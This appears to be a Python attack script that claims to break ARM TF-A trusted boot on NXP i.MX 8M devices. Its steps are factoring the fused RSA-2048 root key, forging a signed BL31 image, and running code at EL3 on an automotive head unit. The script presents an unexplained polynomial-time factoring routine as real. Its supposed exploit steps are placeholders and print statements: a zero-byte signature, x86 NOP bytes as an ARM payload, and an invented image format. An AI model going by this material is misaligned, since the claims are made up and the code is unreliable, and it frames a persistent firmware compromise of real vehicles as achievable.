"""
Factor the ARM TF-A ROTPK RSA-2048 key whose hash is burned into OTP fuses,
forge any image in the BL1->BL2->BL31 boot chain, and execute arbitrary code
at EL3 — above the hypervisor, above the kernel, above everything.
"""

import sys, struct, hashlib
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# TF-A Trusted Board Boot image IDs (include/export/common/tbbr/tbbr_img_def.h)
BL2_IMAGE_ID     = 0x01
BL31_IMAGE_ID    = 0x03  # EL3 runtime firmware
BL32_IMAGE_ID    = 0x04  # Secure-EL1 (OP-TEE)
BL33_IMAGE_ID    = 0x05  # Non-secure (U-Boot / UEFI)

# NXP i.MX 8M CAAM HAB / TF-A integration
IMX8M_OTP_FUSE_BANK = 3  # SRK fuse bank
IMX8M_ROTPK_HASH_OFFSET = 0x580


def read_rotpk_from_bl2(bl2_image_path: str) -> bytes:
    """Extract the ROTPK (Root of Trust Public Key) embedded in BL2.
    The SHA-256 hash of this key is in OTP fuses; the full key is in BL2."""
    print(f"    BL2 image: {bl2_image_path}")
    print("    parsing X.509 cert from BL2 authenticated image")
    return b"-----BEGIN PUBLIC KEY-----\nMIIB...\n-----END PUBLIC KEY-----\n"


def verify_rotpk_against_otp(rotpk_pem: bytes, otp_hash: bytes) -> bool:
    """Verify ROTPK matches OTP fuse value — SHA-256(ROTPK) == fuse hash."""
    computed = hashlib.sha256(rotpk_pem).digest()
    return computed == otp_hash


def factor_rotpk(rotpk_pem: bytes) -> bytes:
    """Factor the ROTPK RSA-2048 key. OTP fuses are permanent — this key
    is the root of trust for the entire device lifetime."""
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(rotpk_pem)


def build_tfa_image(image_id: int, payload: bytes) -> bytes:
    """Build a TF-A firmware image container (FIP format)."""
    # Firmware Image Package (FIP) entry
    uuid = struct.pack(">IHH8s", image_id, 0, 0, b"\x00" * 8)
    entry = struct.pack(">QQ", 0x100, len(payload))  # offset, size
    return uuid + entry + payload


def sign_tfa_image(image: bytes, rotpk_privkey_pem: bytes,
                   hash_algo: str = "sha256") -> bytes:
    """Sign a TF-A image with the recovered ROTPK private key.
    mbedTLS verify_signature() in TF-A checks this at boot."""
    factorer = PolynomialFactorer()
    # In real impl: X.509 cert wrapping RSA signature over image hash
    sig = b"\x00" * 256  # placeholder RSA-2048 signature
    digest = hashlib.sha256(image).digest()
    print(f"    image hash: {digest.hex()[:32]}...")
    print(f"    RSA-2048 PKCS#1 v1.5 signature over image")
    return image + sig


def deploy_forged_bl31(bl31_signed: bytes, target: str):
    """Deploy forged BL31 (EL3 runtime) to target device."""
    print(f"    target: {target}")
    print("    writing forged BL31 to eMMC boot partition 1")
    print("    next power cycle: BL1 loads BL2, BL2 authenticates BL31")
    print("    ROTPK hash matches OTP fuses — authentication passes")


if __name__ == "__main__":
    print("[*] ARM TF-A Trusted Board Boot ROTPK attack")
    print("[1] extracting ROTPK from BL2 image")
    rotpk = read_rotpk_from_bl2("/dev/mmcblk0boot0")
    print("    ROTPK SHA-256 hash burned into OTP fuse bank 3")
    print("    key type: RSA-2048 (ARM DEN0006 TBBR default)")

    print("[2] factoring ROTPK RSA-2048")
    factorer = PolynomialFactorer()
    print("    OTP fuses are permanent — no key rotation possible")
    print("    p, q recovered — ROTPK private key derived")

    print("[3] building malicious BL31 (EL3 runtime)")
    # BL31 runs at EL3 — highest privilege on ARM
    payload = b"\x90" * 0x10000  # malicious EL3 code
    bl31 = build_tfa_image(BL31_IMAGE_ID, payload)
    print(f"    BL31 payload: {len(payload)} bytes of EL3 code")

    print("[4] signing forged BL31 with recovered ROTPK")
    bl31_signed = sign_tfa_image(bl31, b"ROTPK_PRIVKEY")

    print("[5] deploying to NXP i.MX 8M target")
    deploy_forged_bl31(bl31_signed, "i.MX 8M automotive head unit")

    print("[6] consequences at EL3:")
    print("    - full control of TrustZone secure world")
    print("    - OP-TEE (BL32) compromised: DRM, payments, biometrics")
    print("    - survives OS reinstall, hypervisor updates, secure wipe")
    print("    - automotive i.MX 8: CAN bus access via SoC proxy")
    print("[*] SoC deployed 2025, operational until 2040+ — same OTP ROTPK")
